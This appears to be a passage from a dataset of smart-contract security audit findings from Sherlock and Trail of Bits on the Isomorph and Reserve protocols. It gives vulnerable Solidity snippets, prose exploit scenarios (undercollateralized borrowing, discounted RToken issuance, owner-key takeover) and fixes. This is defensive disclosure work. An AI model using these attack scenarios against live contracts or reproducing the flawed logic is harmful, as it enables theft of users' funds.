      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/85 \n\n## Found by \nclems4ever, cccz, CodingNameKiki, HollaDieWaldfee, Jeiwan, caventa, libratus, KingNFT\n\n## Summary\nThe ````openLoan()```` function  wrongly use ````isoUSDLoaned```` to calculate ````totalUSDborrowed````. Attacker can exploit it to bypass security check and loan isoUSD with no enough collateral.\n\n## Vulnerability Detail\nvulnerability point\n```solidity\nfunction openLoan(\n    // ...\n    ) external override whenNotPaused \n    {\n    //...\n    uint256 colInUSD = priceCollateralToUSD(currencyKey, _colAmount\n                        + collateralPosted[_collateralAddress][msg.sender]);\n    uint256 totalUSDborrowed = _USDborrowed \n        +  (isoUSDLoaned[_collateralAddress][msg.sender] * virtualPrice)/LOAN_SCALE;\n        // @audit should be isoUSDLoanAndInterest[_collateralAddress][msg.sender]\n    require(totalUSDborrowed >= ONE_HUNDRED_DOLLARS, \"Loan Requested too small\");\n    uint256 borrowMargin = (totalUSDborrowed * minOpeningMargin) / LOAN_SCALE;\n    require(colInUSD >= borrowMargin, \"Minimum margin not met!\");\n\n    // ...\n}\n```\nAttack example:\n<1>Attacker normally loans and produces 10000 isoUSD interest\n<2>Attacker repays principle but left interest\n<3>Attacker open a new 10000 isoUSD loan without providing collateral\n## Impact\nAttacker can loan isoUSD with no enough collateral.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Synths.sol#L120\n\n## Tool used\n\nManual Review\n\n## Recommendation\nSee Vulnerability Detail\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed, duplicate of issue #68 \n\n**kree-dotcom**\n\nFixed https://github.com/kree-dotcom/isomorph/commit/3d77c9f706a52eb6312abc711a007ea8431f749b",
      "summary": "\nThis bug report is about the calculation of the ````totalUSDborrowed```` variable in the ````openLoan()```` function of the Isomorph Vault_Synths.sol contract. The calculation was wrong, as it used the ````isoUSDLoaned```` variable instead of the ````isoUSDLoanAndInterest```` variable. This mistake could be exploited by an attacker to bypass security checks and loan isoUSD without providing enough collateral. The code snippet where the bug was found was https://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Synths.sol#L120. The issue was found by clems4ever, cccz, CodingNameKiki, HollaDieWaldfee, Jeiwan, caventa, libratus, KingNFT and was manually reviewed. The bug was fixed by kree-dotcom in the commit https://github.com/kree-dotcom/isomorph/commit/3d77c9f706a52eb6312abc711a007ea8431f749b.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/85",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "clems4ever",
        "HollaDieWaldfee",
        "cccz",
        "Jeiwan",
        "CodingNameKiki",
        "KingNFT",
        "caventa",
        "libratus"
      ]
    },
    {
      "id": "5684",
      "title": "H-1: User is unable to partially payback loan if they aren't able to post enough isoUSD to bring them back to minOpeningMargin",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/161 \n\n## Found by \n0x52\n\n## Summary\n\nThe only way for a user to reduce their debt is to call closeLoan. If the amount repaid does not bring the user back above minOpeningMargin then the transaction will revert. This is problematic for users that wish to repay their debt but don't have enough to get back to minOpeningMargin as it could lead to unfair liquidations.\n\n## Vulnerability Detail\n\n        if(outstandingisoUSD >= TENTH_OF_CENT){ //ignore leftover debts less than $0.001\n            uint256 collateralLeft = collateralPosted[_collateralAddress][msg.sender] - _collateralToUser;\n            uint256 colInUSD = priceCollateralToUSD(currencyKey, collateralLeft); \n            uint256 borrowMargin = (outstandingisoUSD * minOpeningMargin) / LOAN_SCALE;\n            require(colInUSD > borrowMargin , \"Remaining debt fails to meet minimum margin!\");\n        }\n\nThe checks above are done when a user calls closeLoan. This ensures that the user's margin is back above minOpeningMargin before allowing them to remove any collateral. This is done as a safeguard to block loans users from effectively opening loans at lower than desired margin. This has the unintended consequence that as user cannot pay off any of their loan if they do not increase their loan back above minOpeningMargin. This could prevent users from being able to save a loan that is close to liquidation causing them to get liquidated when they otherwise would have paid off their loan.\n\n## Impact\n\nUser is unable to make partial repayments if their payment does not increase margin enough\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2022-11-isomorph/blob/main/contracts/Isomorph/contracts/Vault_Synths.sol#L197-L248\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI recommend adding a separate function that allows users to pay off their loan without removing any collateral:\n\n    function paybackLoan(\n        address _collateralAddress,\n        uint256 _USDToVault\n        ) external override whenNotPaused \n        {\n        _collateralExists(_collateralAddress);\n        _closeLoanChecks(_collateralAddress, 0, _USDToVault);\n        //make sure virtual price is related to current time before fetching collateral details\n        //slither-disable-next-line reentrancy-vulnerabilities-1\n        _updateVirtualPrice(block.timestamp, _collateralAddress);\n        (   \n            bytes32 currencyKey,\n            uint256 minOpeningMargin,\n            ,\n            ,\n            ,\n            uint256 virtualPrice,\n            \n        ) = _getCollateral(_collateralAddress);\n        //check for frozen or paused collateral\n        _checkIfCollateralIsActive(currencyKey);\n\n        uint256 isoUSDdebt = (isoUSDLoanAndInterest[_collateralAddress][msg.sender] * virtualPrice) / LOAN_SCALE;\n        require( isoUSDdebt >= _USDToVault, \"Trying to return more isoUSD than borrowed!\");\n        uint256 outstandingisoUSD = isoUSDdebt - _USDToVault;\n\n        uint256 collateral = collateralPosted[_collateralAddress][msg.sender];\n        uint256 colInUSD = priceCollateralToUSD(currencyKey, collateral); \n        uint256 borrowMargin = (outstandingisoUSD * liquidatableMargin) / LOAN_SCALE;\n        require(colInUSD > borrowMargin , \"Liquidation margin not met!\");\n        \n        //record paying off loan principle before interest\n        //slither-disable-next-line uninitialized-local-variables\n        uint256 interestPaid;\n        uint256 loanPrinciple = isoUSDLoaned[_collateralAddress][msg.sender];\n        if( loanPrinciple >= _USDToVault){\n            //pay off loan principle first\n            isoUSDLoaned[_collateralAddress][msg.sender] = loanPrinciple - _USDToVault;\n        }\n        else{\n            interestPaid = _USDToVault - loanPrinciple;\n            //loan principle is fully repaid so record this.\n            isoUSDLoaned[_collateralAddress][msg.sender] = 0;\n        }\n        //update mappings with reduced amounts\n        isoUSDLoanAndInterest[_collateralAddress][msg.sender] = isoUSDLoanAndInterest[_collateralAddress][msg.sender] - ((_USDToVault * LOAN_SCALE) / virtualPrice);\n        emit ClosedLoan(msg.sender, _USDToVault, currencyKey, 0);\n        //Now all effects are handled, transfer the assets so we follow CEI pattern\n        _decreaseLoan(_collateralAddress, 0, _USDToVault, interestPaid);\n    }\n\n## Discussion\n\n**kree-dotcom**\n\nSponsor confirmed. This is a difficult fix, it is highly likely that adding an extra function to Vault_Lyra and Vault_Velo will lead to \"code too big\" errors preventing them compiling, we will have to consult with 0x52/Sherlock to see what else can be done to fix this.\n\n**kree-dotcom**\n\nProposing to change the `closeLoan()` check to \n\n`if((outstandingisoUSD > 0) && (_collateralToUser > 0)){ //leftover debt must meet minOpeningMargin if requesting collateral back`\n`uint256 collateralLeft = ...`\n`...`\n        `}`\n\nThis way checks are only triggered if the user is repaying some of their loan and requesting capital back. This allows us to prevent people from opening loans with a lower than minOpeningMargin but allows them to reduce their loan without needing to match the minOpeningMargin.\n\n**kree-dotcom**\n\nApplied fix to `Vault_Synth` here https://github.com/kree-dotcom/isomorph/commit/6b0879e59a3e5156fde88f4c90d0029aa31b3786\n`Vault_Velo` and `Vault_Lyra` fixed here https://github.com/kree-dotcom/isomorph/commit/7b113eaf19c126db796190f271d85bc5c2cba865\n\nNote `Vault_Velo` has to use a slightly different method because we are handling NFTs instead of ERC20s. I have checked the `_calculateProposedReturnedCapital()` function we are relying on will also work fine if given an array of non-owned NFTs (i.e. the user is not receiving any collateral back just reducing their loan) by returning 0.\n\nFix typo in Vault_Velo https://github.com/kree-dotcom/isomorph/commit/67b2f981a7cbe3fb0b6a057dab82d69d6d61fdc9",
      "summary": "\nThis bug report is about a problem in the Isomorph codebase. Specifically, a user is unable to partially payback a loan if they do not have enough isoUSD to bring their loan back up to minOpeningMargin. This could lead to unfair liquidations. The bug was found by 0x52 and the code snippet can be found at the given link.\n\nThe issue is caused by a check done when a user calls closeLoan. This check ensures that the user's margin is back above minOpeningMargin before allowing them to remove any collateral. This works as a safeguard to block loans users from effectively opening loans at lower than desired margin, but it also prevents users from being able to save a loan that is close to liquidation.\n\nThe impact of this bug is that users are unable to make partial repayments if their payment does not increase margin enough.\n\nA possible solution to this issue is to add a separate function that allows users to pay off their loan without removing any collateral. This function would check that the liquidation margin is met, but would not require the user to bring their loan back to minOpeningMargin.\n\nThe fix proposed by kree-dotcom was applied to Vault_Synth, Vault_Velo, and Vault_Lyra. For Vault_Velo, kree-dotcom used a slightly different method because they are handling NFTs instead of ERC20s. This fix was checked to work fine if given an array of non-owned NFTs.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Isomorph",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-11-isomorph-judging/issues/161",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "57080",
      "title": "Inconsistent use of the FixLib library",
      "impact": "LOW",
      "content": "## Description\n\nAccording to the protocol specification for arithmetic operations, all computations performed on `uint192` values, which represent `uint192x18` variables, should use the **FixLib** library. However, numerous computations in the codebase do not comply with the guidance in the specification.\n\nThe protocol specification has the following general guidelines on using the **FixLib** library for `uint192` values:\n\n- Never allow a `uint192` to be implicitly upcast to a `uint256` without a comment explaining what is happening and why.\n- Never explicitly cast between `uint192` and `uint256` values without doing the appropriate numeric conversion (e.g., `toUint()` or `toFix()`).\n- Use standard arithmetic operations on `uint192` values only if you are gas-optimizing a hotspot in p1 and need to remove **FixLib** calls (and leave inline comments explaining what you are doing and why).\n\nThe codebase does not consistently follow these guidelines. Figure 15.1 shows an instance in which a `uint256` is downcast to a `uint192` without an explicit comment.\n\n```solidity\n// ==== Compute and accept collateral ====\n// D18{BU} = D18{BU} * {qRTok} / {qRTok}\nuint192 amtBaskets = uint192(\n    totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) :\n    amtRToken\n);\n```\n\n**Figure 15.1:** Part of the issue function in `RToken.sol#L127-131`\n\nIn the code in figure 15.2, standard arithmetic operations are performed on `uint192` values, but there are no inline comments indicating whether the operations are meant to optimize gas.\n\n```solidity\n// ==== Compute and accept collateral ====\n// Paying out the ratio r, N times, equals paying out the ratio (1 - (1-r)^N) 1 time.\n// Apply payout to RSR backing\nuint192 payoutRatio = FIX_ONE - FixLib.powu(FIX_ONE - rewardRatio, numPeriods);\n```\n\n**Figure 15.2:** Part of the `_payoutRewards` function in `StRSR.sol#L334-336`\n\nFailure to use the **FixLib** library for operations on `uint192` values and to comply with the protocol specification can lead to undefined system behavior.\n\n## Recommendations\n\n**Short term:** Update all parts of the codebase that are not compliant with the protocol specification and include additional comments explaining any deviations from the specification.\n\n**Long term:** Use differential testing to determine whether the use of standard arithmetic operations on `uint192` values introduces any edge cases that would not be an issue if the **FixLib** library were used instead.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57079",
      "title": "RTokens can be purchased at a discount",
      "impact": "MEDIUM",
      "content": "## Reserve Protocol Security Assessment\n\n## Difficulty: Low\n\n### Type: Undefined Behavior\n\n### Description\nIf the collateral in a basket has decreased in price but has not defaulted, users may be able to purchase RTokens at a discount by creating large issuance requests. The status of a collateral token can be either **SOUND**, **IFFY**, or **DISABLED**. If the status of a collateral token is **SOUND**, the price is within a stable range; if it is **IFFY**, the price has deviated from the range; and if it is **DISABLED**, the price has deviated from the range for an extended period of time.\n\nWhen a user makes an issuance request, the `RToken.issue` function checks whether any collateral in the basket is **DISABLED**. If none is, the user will be issued RTokens atomically or over some number of blocks (see figure 14.1). If the issuance is non-atomic, all collateral must be **SOUND** for the vesting to finish.\n\n```solidity\nfunction issue(uint256 amtRToken) external interaction {\n    require(amtRToken > 0, \"Cannot issue zero\");\n    // == Refresh ==\n    main.assetRegistry().refresh();\n    address issuer = _msgSender(); // OK to save: it can't be changed in reentrant runs\n    IBasketHandler bh = main.basketHandler(); // OK to save: can only be changed by gov\n    (uint256 basketNonce, ) = bh.lastSet();\n    IssueQueue storage queue = issueQueues[issuer];\n    [...]\n    // == Checks-effects block ==\n    CollateralStatus status = bh.status();\n    require(status != CollateralStatus.DISABLED, \"basket disabled\");\n    main.furnace().melt();\n    // ==== Compute and accept collateral ====\n    // D18{BU} = D18{BU} * {qRTok} / {qRTok}\n    uint192 amtBaskets = uint192(\n        totalSupply() > 0 ? mulDiv256(basketsNeeded, amtRToken, totalSupply()) : amtRToken\n    );\n    (address[] memory erc20s, uint256[] memory deposits) = bh.quote(amtBaskets, CEIL);\n    // Add amtRToken's worth of issuance delay to allVestAt\n    uint192 vestingEnd = whenFinished(amtRToken); // D18{block number}\n    // Bypass queue entirely if the issuance can fit in this block and nothing blocking\n    if (\n        vestingEnd <= FIX_ONE_256 * block.number &&\n        queue.left == queue.right &&\n        status == CollateralStatus.SOUND\n    ) {\n        // Complete issuance\n        _mint(issuer, amtRToken);\n        uint192 newBasketsNeeded = basketsNeeded + amtBaskets;\n        emit BasketsNeededChanged(basketsNeeded, newBasketsNeeded);\n        basketsNeeded = newBasketsNeeded;\n        // Note: We don't need to update the prev queue entry because queue.left = queue.right\n        emit Issuance(issuer, amtRToken, amtBaskets);\n        address backingMgr = address(main.backingManager());\n        // == Interactions then return: transfer tokens ==\n        for (uint256 i = 0; i < erc20s.length; ++i) {\n            IERC20Upgradeable(erc20s[i]).safeTransferFrom(issuer, backingMgr, deposits[i]);\n        }\n        return;\n    }\n    [...]\n    // == Interactions: accept collateral ==\n    for (uint256 i = 0; i < erc20s.length; ++i) {\n        IERC20Upgradeable(erc20s[i]).safeTransferFrom(issuer, address(this), deposits[i]);\n    }\n}\n```\n\nFigure 14.1: The issue function in `RToken.sol#L95-198`\n\nHowever, if a user makes an issuance request when the status of a collateral token is **IFFY** (because of a price decrease), the user will pay a discounted price for the RTokens. This is because the user sends the cheap collateral immediately, during the call to `RToken.issue`, but the RToken vesting will occur later, after the price of the collateral has stabilized and its status has changed back to **SOUND**.\n\n### Exploit Scenario\nEve notices that a price update has caused the price of a collateral token to plummet and its status to change to **IFFY**. Eve back-runs the price update with a call to the `RToken.issue` function, requesting a large issuance that will need to be vested over some number of blocks. Eve waits for the collateral to return to the **SOUND** state and then immediately calls the `RToken.vestUpTo` function to vest her RTokens.\n\n### Recommendations\n- **Short term**: In the issue function, change `require(status != CollateralStatus.DISABLED)` to `require(status == CollateralStatus.SOUND)`.\n- **Long term**: Use dynamic fuzz testing to identify any edge cases that could invalidate system properties.",
      "summary": "\nThis bug report discusses a security issue in the Reserve Protocol, which is a system that allows users to purchase RTokens using collateral. The issue occurs when the price of the collateral decreases, causing its status to change to **IFFY**. In this scenario, a user can exploit the system by requesting a large issuance of RTokens at a discounted price and then waiting for the collateral to return to its **SOUND** state before vesting the RTokens. The report recommends a short-term fix of changing the `require` statement in the `RToken.issue` function and a long-term solution of using dynamic fuzz testing to identify any other potential issues.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57078",
      "title": "Lack of zero address checks in Deployer constructor",
      "impact": "LOW",
      "content": "## Deployer Contract Vulnerability\n\n## Difficulty\nMedium\n\n## Type\nData Validation\n\n## Description\nThe Deployer contract’s constructor initializes 19 contract addresses but does not check any of those addresses against the zero address. (Note that 13 of the addresses are contained in the `implementations_` input variable object shown in figure 13.1.) If the deployer of the Deployer contract accidentally sets any of those addresses to the zero address, any RToken deployed through the contract would exhibit undefined behavior.\n\n```solidity\nconstructor(\n    IERC20Metadata rsr_,\n    IERC20Metadata comp_,\n    IERC20Metadata aave_,\n    IGnosis gnosis_,\n    IComptroller comptroller_,\n    IAaveLendingPool aaveLendingPool_,\n    Implementations memory implementations_\n) {\n    rsr = rsr_;\n    comp = comp_;\n    aave = aave_;\n    gnosis = gnosis_;\n    comptroller = comptroller_;\n    aaveLendingPool = aaveLendingPool_;\n    implementations = implementations_;\n}\n```\n\n*Figure 13.1: The constructor in Deployer.sol#L41-57*\n\n## Exploit Scenario\nAlice, a developer on the Reserve protocol team, sets the `gnosis` address to the zero address. Her mistake prevents the protocol from holding any token auctions and has severe consequences on the behavior of deployed RTokens.\n\n## Recommendations\n- **Short term:** Have the Deployer contract verify that contract addresses are not set to the zero address.\n- **Long term:** Ensure that all parameters provided by users (whether privileged or unprivileged) are validated on-chain. Additionally, expand the unit test suite to cover additional edge cases and to ensure that the system behaves as expected.\n\n---\n\n**Trail of Bits**  \nReserve Protocol Security Assessment  \nPUBLIC",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57077",
      "title": "System owner has excessive privileges",
      "impact": "HIGH",
      "content": "## Diﬃculty: High\n\n## Type: Data Validation\n\n## Description\nThe owner of the Main contract has excessive privileges, which puts the entire system at risk. The owner of the Main contract is effectively the owner of all periphery contracts and thus the entire system.\n\nAn exhaustive list of the system owner’s privileges is provided in appendix D. These privileges include changing numerous system parameters. For example, at any time, the owner can change the address of any of the following contracts by calling the functions shown in figure 12.1 (which are defined in the ComponentRegistry abstract contract from which Main inherits):\n\n- RToken\n- StRSR\n- AssetRegistry\n- BasketHandler\n- BackingManager\n- Distributor\n- The RevenueTrader of the RToken and RSR token\n- Furnace\n- Broker\n\n```solidity\nIRToken public rToken;\nfunction setRToken(IRToken val) public onlyOwner {\n    emit RTokenSet(rToken, val);\n    rToken = val;\n}\n```\n\n```solidity\nIStRSR public stRSR;\nfunction setStRSR(IStRSR val) public onlyOwner {\n    emit StRSRSet(stRSR, val);\n    stRSR = val;\n}\n```\n\n```solidity\nIBackingManager public backingManager;\nfunction setBackingManager(IBackingManager val) public onlyOwner {\n    emit BackingManagerSet(backingManager, val);\n    backingManager = val;\n}\n```\n\n**Figure 12.1:** Critical address–changing functions in ComponentRegistry.sol#L30-98\n\nThe owner’s ability to change so many critical components of the system architecture creates a single point of failure. It increases the likelihood that the Main contract’s owner will be targeted by an attacker and increases the incentives for the owner to act maliciously.\n\nThe RToken(s) deployed by the Reserve team will be owned by on-chain governance. However, malicious parties with significant stakes may be able to swing proposals in their favor. Alternatively, because the process of creating an RToken is permissionless, the owner of an RToken could also be a single private key.\n\n## Exploit Scenario\nEve is able to take ownership of a newly deployed RToken by gaining access to Alice’s private key, which controls the system. Eve changes the address of the RToken contract to that of a malicious contract (via a call to `setRToken`) and uses the `BackingManager.grantRTokenAllowance` function to grant the malicious contract infinite approval for all collateral tokens. She then proceeds to steal all collateral from the protocol.\n\n## Recommendations\n- **Short term:** Set all addresses in the `ComponentRegistry_init` function, and remove all address-setter functions from the ComponentRegistry contract. Alternatively, add the `onlyInitializing` modifier to all address-setter functions in the ComponentRegistry contract.\n  \n- **Long term:** Develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure.",
      "summary": "\nThis bug report highlights a high difficulty issue related to data validation in the Main contract. The owner of the contract has excessive privileges, which poses a risk to the entire system. The owner can change important system parameters and even the addresses of other contracts. This creates a single point of failure and increases the likelihood of malicious behavior. The report also outlines a potential exploit scenario where an attacker gains access to the owner's private key and steals collateral from the protocol. The report recommends short-term solutions such as removing address-setter functions or adding modifiers, and long-term solutions such as developing user documentation on system risks. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57076",
      "title": "An RSR seizure could leave the StRSR contract unusable",
      "impact": "HIGH",
      "content": "## Reserve Protocol Security Assessment\n\n## Difficulty\nHigh\n\n## Type\nAccess Controls\n\n## Description\nThe seizure of all of the RSR in the staking pool could leave the system in a state that prevents stakers from unstaking. RSR seizures occur when the system is undercapitalized. RSR tokens are seized from the StRSR contract and sent to the BackingManager contract. The contract initiates an auction of the tokens, which enables the protocol to buy back a portion of the collateral token that is causing the deficit.\n\nThis action is triggered via the `seizeRSR` function in the StRSR contract. The tokens that need to be seized (the quantity represented by `rsrAmount`) are taken evenly from the stake pool, the draft pool, and the reward pool. The `stakeRSR` value is the amount of RSR tokens backing current stakes (i.e., the stake pool), `draftRSR` is the amount of RSR tokens reserved for withdrawals (i.e., the draft pool), and `rewards` is the balance of the RSR tokens that are in neither the stake nor draft pool (Figure 11.1).\n\n### Implementation\n```solidity\nfunction seizeRSR(uint256 rsrAmount) external notPaused {\n    require(_msgSender() == address(main.backingManager()), \"not backing manager\");\n    require(rsrAmount > 0, \"Amount cannot be zero\");\n    uint192 initRate = stakeRate;\n    uint256 rsrBalance = main.rsr().balanceOf(address(this));\n    require(rsrAmount <= rsrBalance, \"Cannot seize more RSR than we hold\");\n    if (rsrBalance == 0) return;\n\n    // Calculate dust RSR threshold, the point at which we might as well call it a wipeout\n    uint256 dustRSRAmt = (MIN_EXCHANGE_RATE * (totalDrafts + totalStakes)) / FIX_ONE; // {qRSR}\n    uint256 seizedRSR;\n    if (rsrBalance <= rsrAmount + dustRSRAmt) {\n        // Rebase event: total RSR stake wipeout\n        seizedRSR = rsrBalance;\n        beginEra();\n    } else {\n        uint256 rewards = rsrRewards();\n        // Remove RSR evenly from stakeRSR, draftRSR, and the reward pool\n        uint256 stakeRSRToTake = (stakeRSR * rsrAmount + (rsrBalance - 1)) / rsrBalance;\n        stakeRSR -= stakeRSRToTake;\n        seizedRSR = stakeRSRToTake;\n        stakeRate = stakeRSR == 0 ? FIX_ONE : uint192((FIX_ONE_256 * totalStakes) / stakeRSR);\n        uint256 draftRSRToTake = (draftRSR * rsrAmount + (rsrBalance - 1)) / rsrBalance;\n        draftRSR -= draftRSRToTake;\n        seizedRSR += draftRSRToTake;\n        draftRate = draftRSR == 0 ? FIX_ONE : uint192((FIX_ONE_256 * totalDrafts) / draftRSR);\n        // Removing from unpaid rewards is implicit\n        seizedRSR += (rewards * rsrAmount + (rsrBalance - 1)) / rsrBalance;\n    }\n    // Transfer RSR to caller\n    emit ExchangeRateSet(initRate, stakeRate);\n    exchangeRateHistory.push(HistoricalExchangeRate(uint32(block.number), stakeRate));\n    IERC20Upgradeable(address(main.rsr())).safeTransfer(_msgSender(), seizedRSR);\n}\n```\n*Figure 11.1: The seizeRSR function in `StRSR.sol#L244-282`*\n\nIf `stakeRSR` is set to zero in the else closure highlighted in Figure 11.1, the `beginEra` function should be called. The `beginEra` function allows the system to reset a staking pool that has experienced a significant token seizure. However, `beginEra` is not called; thus, `totalStakes` will be a non-zero value and `stakeRate` will be `FIX_ONE`, but `stakeRSR` will be zero. When users try to unstake their tokens by calling the `unstake` function, the calls will revert (Figure 11.2).\n\n### Implementation\n```solidity\nfunction unstake(uint256 stakeAmount) external notPaused {\n    address account = _msgSender();\n    require(stakeAmount > 0, \"Cannot withdraw zero\");\n    require(stakes[era][account] >= stakeAmount, \"Not enough balance\");\n    _payoutRewards();\n\n    // ==== Compute changes to stakes and RSR accounting\n    // rsrAmount: how many RSR to move from the stake pool to the draft pool\n    // pick rsrAmount as big as we can such that (newTotalStakes <= newStakeRSR * stakeRate)\n    _burn(account, stakeAmount);\n    // {qRSR} = D18 * {qStRSR} / D18{qStRSR/qRSR}\n    uint256 newStakeRSR = (FIX_ONE_256 * totalStakes) / stakeRate;\n    uint256 rsrAmount = stakeRSR - newStakeRSR;\n    stakeRSR = newStakeRSR;\n\n    // Create draft\n    (uint256 index, uint64 availableAt) = pushDraft(account, rsrAmount);\n    emit UnstakingStarted(index, era, account, rsrAmount, stakeAmount, availableAt);\n}\n```\n*Figure 11.2: The unstake function in `StRSR.sol#L178-198`*\n\nThis edge case can occur only if `rsrBalance`, `stakeRSR`, and `rsrAmount` are approximately equal, but `rsrBalance` is just large enough to be greater than the sum of `rsrAmount` and `dustRSRAmt`, causing `seizeRSR` to enter the else closure. At that point, the only way to recover the system is for someone to stake enough RSR to render the `stakeRSR` value equal to `totalStakes`. Then everyone who wishes to exit the system will be able to do so.\n\n## Exploit Scenario\nEve sends RSR tokens to the StRSR contract, causing `rsrBalance` to be greater than the sum of `rsrAmount` and `dustRSRAmt` but approximately equal to `stakeRSR` and `rsrAmount`. Her transaction is followed by a call to `seizeRSR`, in which `stakeRSRToTake` ends up being equal to `stakeRSR`. The `stakeRSR` value is then set to zero, but a new era is not started. Alice and Bob try to unstake their tokens from the system but are unable to do so because there is no `stakeRSR` to use as their exit liquidity.\n\n## Recommendations\n- **Short term:** Have the StRSR contract call the `beginEra` function if `stakeRSR` is set to zero.\n- **Long term:** Use dynamic fuzz testing to identify any edge cases that could invalidate system properties.",
      "summary": "\nThe report highlights a potential security risk in the Reserve Protocol, specifically in the Access Controls. The issue arises when all the RSR tokens in the staking pool are seized, leaving the system undercapitalized and preventing stakers from unstaking their tokens. This can occur when the `seizeRSR` function in the StRSR contract is triggered and the `stakeRSR` value is set to zero, without starting a new era. This can lead to users being unable to unstake their tokens, causing a potential loss of funds. The report suggests a short-term solution of having the contract call the `beginEra` function in this scenario and a long-term solution of using dynamic fuzz testing to identify any other potential edge cases. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57075",
      "title": "Inability to validate the recency of Aave and Compound oracle data",
      "impact": "LOW",
      "content": "## Reserve Protocol Security Assessment\n\n## Difficulty: High\n\n## Type: Data Validation\n\n### File Path\n`contracts/plugins/assets/abstract/CompoundOracleMixin.sol`\n\n### Description\nThe Aave and Compound oracle systems do not provide timestamps or round data. Thus, the Reserve protocol cannot validate the recency of the pricing data they provide. The Reserve protocol obtains pricing data for collateral and RSR tokens from the Aave and Compound oracle systems. Each oracle system relies on a Chainlink price feed as its underlying data feed. However, unlike Chainlink, Aave and Compound do not provide information on when a price was last updated. Thus, the pricing data reported to the Reserve protocol could be stale or invalid, exposing the protocol to risk. Additionally, in extreme market conditions, Chainlink may pause its oracle systems, which can increase the risk of undefined behavior.\n\n### Exploit Scenario\nThe Chainlink system experiences an outage that prevents price feeds from being updated for an extended period of time. The Aave and Compound oracle systems continue reporting pricing data from the outdated feeds. During the outage, the status of a collateral token changes from SOUND to IFFY, but the change is not reflected on-chain. Eve is monitoring the prices off-chain and purchases RTokens during the outage, before an update causes the price to increase.\n\n### Recommendations\n- **Short term**: Consider obtaining pricing data from Chainlink, which enables a protocol to validate the recency of its data.\n- **Long term**: Consider using an off-monitoring solution to track extreme market conditions and to ensure that the Chainlink oracle system is live.\n\n### References\n- Chainlink: Risk Mitigation\n- Chainlink: Monitoring Data Feeds\n\nTrail of Bits  \nReserve Protocol Security Assessment  \nPUBLIC",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "TrailOfBits",
      "protocol_name": "Reserve",
      "source_link": "https://github.com/trailofbits/publications/blob/master/reviews/2022-08-reserve-protocol-securityreview.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Felipe Manzano",
        "Anish Naik"
      ]
    },
    {
      "id": "57074",
      "title": "Token auctions may not cover entire collateral token deﬁcits",
      "impact": "LOW",
      "content": "## Diﬃculty: High\n\n## Type: Data Validation\n\n## Description\nBecause of incorrect data validation, token auctions initiated to cover a specific deficit may not always cover the entire deficit amount.\n\nWhen the system is not fully capitalized (i.e., the number of BUs held by the BackingManager contract is less than the number required by the RToken contract), the BackingManager will try to identify the token most in surplus and the collateral token with the largest deficit. If the former token is not a collateral token or is a collateral token that has not defaulted, the `prepareTradeToCoverDeficit` function will be called (figure 9.1). This function tries to compute the number of sell tokens that need to be sold to cover a fixed number of buy tokens (i.e., the deficit). By contrast, the `prepareTradeSell` function tries to compute the number of buy tokens that can be bought given a fixed number of sell tokens.\n\n```solidity\nfunction nonRSRTrade(bool useFallenTarget)\nexternal\nview\nreturns (bool doTrade, TradeRequest memory req)\n{\n(\n    IAsset surplus,\n    ICollateral deficit,\n    uint192 surplusAmount,\n    uint192 deficitAmount\n) = largestSurplusAndDeficit(useFallenTarget);\nif (address(surplus) == address(0) || address(deficit) == address(0)) return (false, req);\n\n// Of primary concern here is whether we can trust the prices for the assets\n// we are selling. If we cannot, then we should ignore `maxTradeSlippage`.\nif (\n    surplus.isCollateral() &&\n    assetRegistry().toColl(surplus.erc20()).status() == CollateralStatus.DISABLED\n) {\n    (doTrade, 